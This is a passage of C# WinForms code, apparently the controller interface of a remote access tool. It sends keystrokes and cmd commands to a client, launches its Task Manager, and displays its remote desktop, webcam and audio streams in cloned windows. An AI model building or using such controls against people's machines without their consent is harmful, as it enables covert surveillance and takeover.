                        keysToSend += e.KeyCode.ToString().ToLower();
                    }


                }

                if (Console.CapsLock == true)
                {

                    if (e.KeyValue >= 65 && e.KeyValue <= 90)
                    {
                        keysToSend += e.KeyCode.ToString().ToUpper();
                    }

                }
                
                //if (e.KeyValue >= 65 && e.KeyValue <= 90)
                //    keysToSend += e.KeyCode.ToString().ToLower();

                 if (e.KeyCode.ToString().Equals("Back"))
                    keysToSend += ("{BS}");
                else if (e.KeyCode.ToString().Equals("Pause"))
                    keysToSend += ("{BREAK}");
                else if (e.KeyCode.ToString().Equals("Capital"))
                    keysToSend += ("{CAPSLOCK}");
                else if (e.KeyCode.ToString().Equals("Space"))
                    keysToSend += (" ");
                else if (e.KeyCode.ToString().Equals("Home"))
                    keysToSend += ("{HOME}");
                else if (e.KeyCode.ToString().Equals("Return"))
                    keysToSend += ("{ENTER}");
                else if (e.KeyCode.ToString().Equals("End"))
                    keysToSend += ("{END}");
                else if (e.KeyCode.ToString().Equals("Tab"))
                    keysToSend += ("{TAB}");
                else if (e.KeyCode.ToString().Equals("Escape"))
                    keysToSend += ("{ESC}");
                else if (e.KeyCode.ToString().Equals("Insert"))
                    keysToSend += ("{INS}");
                else if (e.KeyCode.ToString().Equals("Up"))
                    keysToSend += ("{UP}");
                else if (e.KeyCode.ToString().Equals("Down"))
                    keysToSend += ("{DOWN}");
                else if (e.KeyCode.ToString().Equals("Left"))
                    keysToSend += ("{LEFT}");
                else if (e.KeyCode.ToString().Equals("Right"))
                    keysToSend += ("{RIGHT}");
                else if (e.KeyCode.ToString().Equals("PageUp"))
                    keysToSend += ("{PGUP}");
                else if (e.KeyCode.ToString().Equals("Next"))
                    keysToSend += ("{PGDN}");
                else if (e.KeyCode.ToString().Equals("Tab"))
                    keysToSend += ("{TAB}");
                else if (e.KeyCode.ToString().Equals("D1"))
                    keysToSend += "1";
                else if (e.KeyCode.ToString().Equals("D2"))
                    keysToSend += "2";
                else if (e.KeyCode.ToString().Equals("D3"))
                    keysToSend += "3";
                else if (e.KeyCode.ToString().Equals("D4"))
                    keysToSend += "4";
                else if (e.KeyCode.ToString().Equals("D5"))
                    keysToSend += "5";
                else if (e.KeyCode.ToString().Equals("D6"))
                    keysToSend += "6";
                else if (e.KeyCode.ToString().Equals("D7"))
                    keysToSend += "7";
                else if (e.KeyCode.ToString().Equals("D8"))
                    keysToSend += "8";
                else if (e.KeyCode.ToString().Equals("D9"))
                    keysToSend += "9";
                else if (e.KeyCode.ToString().Equals("D0"))
                    keysToSend += "0";
                else if (e.KeyCode.ToString().Equals("F1"))
                    keysToSend += "{F1}";
                else if (e.KeyCode.ToString().Equals("F2"))
                    keysToSend += "{F2}";
                else if (e.KeyCode.ToString().Equals("F3"))
                    keysToSend += "{F3}";
                else if (e.KeyCode.ToString().Equals("F4"))
                    keysToSend += "{F4}";
                else if (e.KeyCode.ToString().Equals("F5"))
                    keysToSend += "{F5}";
                else if (e.KeyCode.ToString().Equals("F6"))
                    keysToSend += "{F6}";
                else if (e.KeyCode.ToString().Equals("F7"))
                    keysToSend += "{F7}";
                else if (e.KeyCode.ToString().Equals("F8"))
                    keysToSend += "{F8}";
                else if (e.KeyCode.ToString().Equals("F9"))
                    keysToSend += "{F9}";
                else if (e.KeyCode.ToString().Equals("F10"))
                    keysToSend += "{F10}";
                else if (e.KeyCode.ToString().Equals("F11"))
                    keysToSend += "{F11}";
                else if (e.KeyCode.ToString().Equals("F12"))
                    keysToSend += "{F12}";
                else if (e.KeyValue == 186)
                    keysToSend += "{;}";
                else if (e.KeyValue == 222)
                    keysToSend += "'";
                else if (e.KeyValue == 191)
                    keysToSend += "/";
                else if (e.KeyValue == 190)
                    keysToSend += ".";
                else if (e.KeyValue == 188)
                    keysToSend += ",";
                else if (e.KeyValue == 219)
                    keysToSend += "{[}";
                else if (e.KeyValue == 221)
                    keysToSend += "{]}";
                else if (e.KeyValue == 220)
                    keysToSend += "\\";
                else if (e.KeyValue == 187)
                    keysToSend += "{=}";
                else if (e.KeyValue == 189)
                    keysToSend += "{-}";
                else if (e.KeyValue == 233)
                    keysToSend += "é";
                else if (e.KeyValue == 225)
                    keysToSend += "á";
                else if (e.KeyValue == 369)
                    keysToSend += "ű";
                else if (e.KeyValue == 337)
                    keysToSend += "ő";
                else if (e.KeyValue == 250)
                    keysToSend += "ú";
                else if (e.KeyValue == 246)
                    keysToSend += "ö";
                else if (e.KeyValue == 252)
                    keysToSend += "ü";
                else if (e.KeyValue == 243)
                    keysToSend += "ó";

                
             

                // parent.loopSend("rtype-" + keysToSend);

                loopSend("rtype-" + keysToSend);
               
            }
            txtBControlKeyboard.Clear(); 
        }
        // start remote task manager
        private void btnStartTaskManager_Click(object sender, EventArgs e) // i added this as the windows security screen would block screenshots
        {
            loopSend("tskmgr");
        }
        // this gets how many screens are available on the client
        private void btnCountScreens_Click(object sender, EventArgs e)
        {
            cmboChooseScreen.Items.Clear();
            loopSend("countScreens");
        }



        public class audioStream
        {
            NAudio.Wave.BufferedWaveProvider provider;
            NAudio.Wave.WaveOut waveOut;

            public void init()
            {
                provider = new NAudio.Wave.BufferedWaveProvider(new NAudio.Wave.WaveFormat());
                waveOut = new NAudio.Wave.WaveOut();
                waveOut.Init(provider);
                waveOut.Play();
            }

            public void bufferPlay(byte[] recv)
            {
                provider.AddSamples(recv, 0, recv.Length);
                recv = null;
            }

            public void destroy()
            {
                waveOut.Stop();
                provider.ClearBuffer();
                waveOut.Dispose();
                waveOut = null;
                provider = null;
            }
        }
    }
    public class routeWindow
    {
        public TabPage page;
        private List<string> disableWrite = new List<string>();
        private Form currentRoute = new Form();
        private TabPage orgBackup = new TabPage();

        public void routePage()
        {
            if (page == null) return;

            Control.ControlCollection controls = page.Controls;
            Form route = new Form();
            route.Size = page.Parent.Size;
            route.Text = "RouteWindow[" + (Form1.routeWindow.Count + 1).ToString() + "] " + page.Text;
            route.WindowState = FormWindowState.Normal;
            route.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            route.BackColor = SystemColors.Window;
            string assignContextMenu = "";
            ContextMenuStrip cloneCMS = new ContextMenuStrip();

            foreach (Control c in controls)
            {
                string name = c.Name;
                string type = getControlType(name);
                Control add;
                if (type == "") continue;
                switch (type)
                {
                    case "label":

                        Label l = new Label();
                        Label reference = (Label)c;
                        l.Location = c.Location;
                        l.Font = c.Font;
                        l.BackColor = c.BackColor;
                        l.Text = c.Text;
                        l.Name = c.Name;
                        l.ForeColor = c.ForeColor;
                        l.AutoSize = reference.AutoSize;
                        add = l;

                        route.Controls.Add(l);

                        break;

                    case "button":

                        Button b = new Button();
                        Button bref = c as Button;

                        b.Text = bref.Text;
                        b.Location = bref.Location;
                        b.Size = bref.Size;
                        b.AutoSize = bref.AutoSize;
                        b.BackColor = bref.BackColor;
                        b.ForeColor = bref.ForeColor;
                        b.UseVisualStyleBackColor = bref.UseVisualStyleBackColor;
                        b.Click += new EventHandler(onClick);
                        b.Name = bref.Name;

                        route.Controls.Add(b);

                        break;

                    case "comboBox":

                        ComboBox cb = new ComboBox();
                        ComboBox cref = (ComboBox)c;

                        cb.Text = cref.Text;
                        cb.Name = cref.Name;
                        cb.Location = cref.Location;
                        cb.Size = cref.Size;
                        cb.SelectedItem = cref.SelectedItem;
                        foreach (object item in cref.Items)
                        {
                            cb.Items.Add(item);
                        }
                        cb.ForeColor = cref.ForeColor;
                        cb.BackColor = cref.BackColor;
                        cb.SelectedIndex = cref.SelectedIndex;
                        cb.Font = cref.Font;
                        cb.SelectedValueChanged += new EventHandler(onItemChange);

                        route.Controls.Add(cb);

                        break;

                    case "richTextBox":

                        RichTextBox rtb = new RichTextBox();
                        RichTextBox rref = (RichTextBox)c;

                        rtb.Name = rref.Name;
                        rtb.Text = rref.Text;
                        rtb.BackColor = rref.BackColor;
                        rtb.ForeColor = rref.ForeColor;
                        rtb.Location = rref.Location;
                        rtb.Size = rref.Size;
                        rtb.WordWrap = rref.WordWrap;
                        rtb.Font = rref.Font;
                        rtb.TextChanged += new EventHandler(onTextChange);

                        route.Controls.Add(rtb);

                        break;

                    case "textBox":

                        TextBox t = new TextBox();
                        TextBox tref = (TextBox)c;

                        t.Name = tref.Name;
                        t.Text = tref.Text;
                        t.BackColor = tref.BackColor;
                        t.ForeColor = tref.ForeColor;
                        t.Location = tref.Location;
                        t.Size = tref.Size;
                        t.TextChanged += new EventHandler(onTextChange);
                        t.KeyDown += new KeyEventHandler(onKeyDown);
                        t.Font = tref.Font;
                        t.UseSystemPasswordChar = tref.UseSystemPasswordChar;
                        t.PasswordChar = tref.PasswordChar;
                        if (tref.Tag != null) t.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + tref.Tag.ToString();

                        route.Controls.Add(t);

                        break;

                    case "listView":

                        ListView lv = new ListView();
                        ListView lref = (ListView)c;

                        lv.Name = lref.Name;
                        lv.View = lref.View;
                        lv.BackColor = lref.BackColor;
                        lv.ForeColor = lref.ForeColor;
                        lv.Location = lref.Location;
                        lv.Size = lref.Size;
                        lv.FullRowSelect = lref.FullRowSelect;
                        lv.GridLines = lref.GridLines;
                        if (lref.ContextMenuStrip != null)
                        {
                            assignContextMenu = lv.Name;
                            cloneCMS = lref.ContextMenuStrip;
                        }

                        foreach (ColumnHeader ch in lref.Columns)
                        {
                            ColumnHeader header = new ColumnHeader();
                            header.DisplayIndex = ch.DisplayIndex;
                            header.Name = ch.Name;
                            header.Text = ch.Text;
                            header.Width = ch.Width;

                            lv.Columns.Add(header);
                        }
                        foreach (ListViewItem i in lref.Items)
                        {
                            ListViewItem lvi = new ListViewItem();
                            lvi.BackColor = i.BackColor;
                            lvi.Focused = i.Focused;
                            lvi.Font = i.Font;
                            lvi.ForeColor = i.ForeColor;
                            lvi.Name = i.Name;
                            lvi.Text = i.Text;
                            lvi.Selected = i.Selected;
                            foreach (ListViewItem.ListViewSubItem si in i.SubItems)
                            {
                                ListViewItem.ListViewSubItem sitem = new ListViewItem.ListViewSubItem();
                                sitem.BackColor = si.BackColor;
                                sitem.Font = si.Font;
                                sitem.ForeColor = si.ForeColor;
                                sitem.Name = si.Name;
                                sitem.Text = si.Text;
                                lvi.SubItems.Add(sitem);
                            }
                            lv.Items.Add(lvi);
                        }

                        lv.SelectedIndexChanged += new EventHandler(onIndexChange);
                        lv.Font = lref.Font;

                        route.Controls.Add(lv);

                        break;

                    case "checkBox":

                        CheckBox cx = new CheckBox();
                        CheckBox xref = (CheckBox)c;

                        cx.Text = xref.Text;
                        cx.Name = xref.Name;
                        cx.Checked = xref.Checked;
                        cx.ForeColor = xref.ForeColor;
                        cx.BackColor = xref.BackColor;
                        cx.Location = xref.Location;
                        cx.AutoSize = xref.AutoSize;
                        cx.Size = xref.Size;
                        cx.Font = xref.Font;
                        cx.CheckedChanged += new EventHandler(onCheck);

                        route.Controls.Add(cx);

                        break;

                    case "pictureBox":

                        PictureBox pb = new PictureBox();
                        PictureBox pref = (PictureBox)c;
                        pb.Name = pref.Name;
                        pb.Size = pref.Size;
                        pb.SizeMode = pref.SizeMode;
                        pb.Image = pref.Image;
                        pb.Location = pref.Location;
                        pb.BackColor = pref.BackColor;
                        pb.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + pref.Tag.ToString();
                        if (pref.Tag.ToString() == "rdesktop") Form1.rdRouteUpdate = pb.Tag.ToString();
                        if (pref.Tag.ToString() == "wcstream") Form1.wcRouteUpdate = pb.Tag.ToString();

                        route.Controls.Add(pb);

                        break;
                }
            }

            route.Show();
            route.FormClosing += new FormClosingEventHandler(onRouteDestroy);
            Form1.routeWindow.Add(route);
            if (assignContextMenu != "")
            {
                Control acms = route.Controls.Find(assignContextMenu, false)[0];
                ContextMenuStrip copyCMS = new ContextMenuStrip();
                copyCMS.AutoSize = cloneCMS.AutoSize;
                copyCMS.Font = cloneCMS.Font;
                copyCMS.BackColor = cloneCMS.BackColor;
                copyCMS.ForeColor = cloneCMS.ForeColor;
                copyCMS.Name = cloneCMS.Name;
                copyCMS.Size = cloneCMS.Size;
                copyCMS.Text = cloneCMS.Text;

                foreach (ToolStripItem i in cloneCMS.Items)
                {
                    copyCMS.Items.Add(i.Text, i.Image, onClick);
                }
                int track = 0;
                foreach (ToolStripItem i in copyCMS.Items)
                {
                    i.BackColor = SystemColors.Window;
                    i.Name = cloneCMS.Items[track].Name;
                    track++;
                }

                //route.Controls.Add(copyCMS);
                acms.ContextMenuStrip = copyCMS;
            }

            Timer update = new Timer();
            update.Interval = 1200; //prev. 1000
            update.Tick += new EventHandler(updateUI);
            currentRoute = route;
            update.Start();
        }

        private void onKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && Form1.isCmdStarted)
            {
                TextBox me = sender as TextBox;
                if (me.Tag.ToString().Split('.')[2] == "rcmd")
                {
                    string command = "cmd§" + me.Text;
                    me.Text = "";
                    Form1 f = new Form1();
                    f.loopSend(command);
                }
            }
            else if (e.KeyCode == Keys.Return && !Form1.isCmdStarted)
            {
                MessageBox.Show(Form1.me, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void onRouteDestroy(object sender, FormClosingEventArgs e)
        {
            Form dieRoute = (Form)sender;
            string dieRouteID = dieRoute.Text.Split('[')[1].Substring(0, 1);
            string rdUpdateID = Form1.rdRouteUpdate.Split('.')[0].Replace("route", "");
            string wcUpdateID = Form1.wcRouteUpdate.Split('.')[0].Replace("route", "");
            if (dieRouteID == rdUpdateID)
            {
                Form1.rdRouteUpdate = "route0.none";
            }
            if (dieRouteID == wcUpdateID)
            {
                Form1.wcRouteUpdate = "route0.none";
            }
            Form1.routeWindow.Remove(dieRoute);
            int exitPoint = int.Parse(dieRouteID) - 1;

            for (int i = exitPoint; i < Form1.routeWindow.Count; i++)
            {
                int currentRouteID = int.Parse(Form1.routeWindow[i].Text.Split('[')[1].Substring(0, 1));
                string textStart = Form1.routeWindow[i].Text.Split('[')[0];
                string textEnd = Form1.routeWindow[i].Text.Split('[')[1];
                textEnd = textEnd.Substring(1);
                textEnd = "[" + (currentRouteID - 1).ToString() + textEnd;
                Form1.routeWindow[i].Text = textStart + textEnd;
            }

            //Die :(
        }

        private void onItemChange(object sender, EventArgs e)
        {
            Control ctl = sender as Control;

            if (ctl.Name.StartsWith("comboBox"))
            {
                ComboBox cb = ctl as ComboBox;
                string slitem = cb.SelectedItem.ToString();
                Form1.setvalue.Add(cb.Name + "§" + slitem);
            }
        }

        private bool getignoreState(string name)
        {
            bool isIgnore = false;

            foreach (string pending in Form1.setvalue)
            {
                if (pending.Split('§')[0] == name)
                {
                    isIgnore = true;
                    break;
                }
            }

            return isIgnore;
        }

        private void onCheck(object sender, EventArgs e)
        {
            CheckBox cb = sender as CheckBox;
            bool check = cb.Checked;
            string name = cb.Name;
            Form1.setvalue.Add(name + "§" + check.ToString().ToLower());
        }

        private void onTextChange(object sender, EventArgs e)
        {
            Control t = sender as Control;
            string name = t.Name;
            string text = t.Text;
            if (disableWrite.Contains(name)) return;
            Form1.setvalue.Add(name + "§" + text);
        }

        private void onIndexChange(object sender, EventArgs e)
        {
            Console.WriteLine("index changed");
            //if (Form1.protectLv) return;
            /*if (Form1.rwriteLv == 1)
            {
                Form1.rwriteLv = 0;
                Console.WriteLine("Disable rwirteLV");
                return;
            }*/
            //if (Form1.rwriteLv == 1) Form1.rwriteLv++;
            string name = "";
            Control ctl = sender as Control;
            name = ctl.Name;
            if (ctl.Name.StartsWith("listView"))
            {
                ListView lv = ctl as ListView;
                int index = -1;
                if (lv.SelectedIndices.Count > 0) index = lv.SelectedIndices[0];
                if (index != -1)
                {
                    Console.WriteLine("setIndex: " + index.ToString());
                    Form1.setvalue.Add(name + "§" + index.ToString());
                }
            }
        }

        private void onClick(object sender, EventArgs e)
        {
            try
            {
                Control send = (Control)sender;
                int routeID = int.Parse(send.Parent.Text.Split('[')[1].Substring(0, 1));
                Form1.setFocusRouteID = routeID;
                Control remoteObj = page.Controls.Find(send.Name, false)[0];
                Button remoteButton = (Button)remoteObj;
                TabPage backup = Form1.selected;
                Form1.setPagebackup = backup;
                Form1.setvalue.Add("tabControl1§" + page.Name.Replace("tabPage", ""));
                Timer t = new Timer();
                t.Interval = 200;
                t.Tick += new EventHandler(waitForTabChange);
                Form1.rbutton = remoteButton;
                t.Start();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Routed Window button onclick error ERROR = " + ex.Message);
                //ToolStripItem
                ToolStripItem send = (ToolStripItem)sender;
                //MessageBox.Show(send.Name);
                Form1 parent = new Form1();
                
                parent.executeToolStrip(send.Name);
            }
        }

        private void waitForTabChange(object sender, EventArgs e)
        {
            if (Form1.setFocusBack == 1)
            {
                if (Form1.selected == page)
                {
                    Form1.rbutton.PerformClick();
                    Form1.rbutton = new Button();
                    Form1.setvalue.Add("tabControl1§" + Form1.setPagebackup.Name.Replace("tabPage", ""));
                    Form1.setFocusBack = 2;
                    return;
                }
            }

            if (Form1.setFocusBack == 2)
            {
                if (Form1.selected == Form1.setPagebackup)
                {
                    int ID = Form1.setFocusRouteID;
                    Form cRoute = Form1.routeWindow[ID - 1];
                    cRoute.BringToFront();
                    Timer me = (Timer)sender;
                    Form1.setFocusBack = 1;
                    Form1.setFocusRouteID = -1;
                    me.Stop();
                }
            }
        }

        private void updateUI(object sender, EventArgs e)
        {
            Control.ControlCollection controls = currentRoute.Controls;

            foreach (Control c in controls)
            {
                string name = c.Name;
                string type = getControlType(name);
                if (type == "") continue;
                if (getignoreState(name)) continue;
                switch (type)
                {
                    case "label":

                        Label l = (Label)c;
                        string lc = l.Text;
                        string lv = Form1.getValue(l.Name);

                        if (lv != lc)
                        {
                            l.Text = lv;
                        }

                        break;

                    case "button":

                        Button b = (Button)c;
                        string bc = b.Text;
                        string bv = Form1.getValue(b.Name);

                        if (bv != bc)
                        {
                            b.Text = bv;
                        }

                        break;

                    case "comboBox":

                        ComboBox cb = (ComboBox)c;
                        string iname = cb.SelectedItem.ToString();
                        string vname = new Form1().getSelectedItem(cb.Name);
                        if (iname != vname && !cb.DroppedDown)
                        {
                            cb.SelectedItem = vname;
                        }

                        break;

                    case "richTextBox":

                        RichTextBox rtb = (RichTextBox)c;
                        string rtbc = rtb.Text;
                        string rtbv = Form1.getValue(rtb.Name);

                        if (rtbv != rtbc)
                        {
                            disableWrite.Add(rtb.Name);
                            rtb.Text = rtbv;
                        }

                        break;

                    case "textBox":

                        TextBox tb = (TextBox)c;
                        string tbc = tb.Text;
                        string tbv = Form1.getValue(tb.Name);

                        if (tbv != tbc)
                        {
                            disableWrite.Add(tb.Name);
                            tb.Text = tbv;
                        }

                        break;

                    case "listView":

                        //Check items

                        ListView liv = (ListView)c;
                        List<string> myItems = new List<string>();

                        foreach (ListViewItem lvi in liv.Items)
                        {
                            string emt = "";
                            int sindex = lvi.SubItems.Count;
                            int count = 0;
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems)
                            {
                                if (si.Text == "")
                                {
                                    count++;
                                    continue;
                                }

                                if (count < sindex)
                                {
                                    emt += si.Text + "|";
                                }
                                else
                                {
                                    emt += si.Text;
                                }

                                //Console.WriteLine("GET Emt: " + emt);

                                count++;
                            }
                            myItems.Add(emt);
                        }

                        string[] ritems = new Form1().getItems(liv.Name, "items");
                        bool editItems = false;

                        if (myItems.Count == ritems.Length)
                        {
                            for (int i = 0; i < ritems.Length; i++)
                            {
                                string validate1 = ritems[i];
                                string validate2 = myItems[i];

                                //Console.WriteLine("VALIDATE\n   Remote: " + validate1 + "\n     generated: " + validate2);

                                if (validate1 != validate2)
                                {
                                    Console.WriteLine("INVALID \n " + validate1 + "\n " + validate2);
                                    editItems = true;
                                    break;
                                }
                            }
                        }
                        else
                        {
                            editItems = true;
                        }

                        if (editItems)
                        {
                            //MessageBox.Show("edit");
                            liv.Items.Clear();
                            foreach (string item in ritems)
                            {
                                ListViewItem add = new ListViewItem(item.Split('|')[0]);
                                int track = 0;
                                foreach (string sitem in item.Split('|'))
                                {
                                    if (track == 0)
                                    {
                                        track++;
                                        continue;
                                    }

                                    add.SubItems.Add(sitem);

                                    track++;
                                }
                                liv.Items.Add(add);
                            }
                        }

                        //checkSelect

                        string selected = new Form1().getItems(liv.Name, "selected")[0];
                        if (selected != "-1" && !Form1.protectLv)
                        {
                            Form1.rwriteLv = 1;

                            if (liv.SelectedIndices.Count > 0)
                            {
                                if (liv.SelectedIndices[0] != int.Parse(selected))
                                {
                                    liv.Items[liv.SelectedIndices[0]].Selected = false;
                                    liv.Items[int.Parse(selected)].Selected = true;
                                }
                            }
                            else
                            {
                                liv.Items[int.Parse(selected)].Selected = true;
                            }
                        }


                        break;

                    case "checkBox":

                        CheckBox cx = (CheckBox)c;
                        bool xbc = cx.Checked;
                        bool xbv = new Form1().getChecked(cx.Name);

                        if (xbv != xbc)
                        {
                            cx.Checked = xbv;
                        }

                        break;
                }
            }

            disableWrite.Clear();
        }

        private string getControlType(string name)
        {
            string type = "";

            for (int i = 0; i < name.Length; i++)
            {
                if (char.IsNumber(name, i))
                {
                    break;
                }
                type += name[i];
            }

            return type;
        }
    }
}
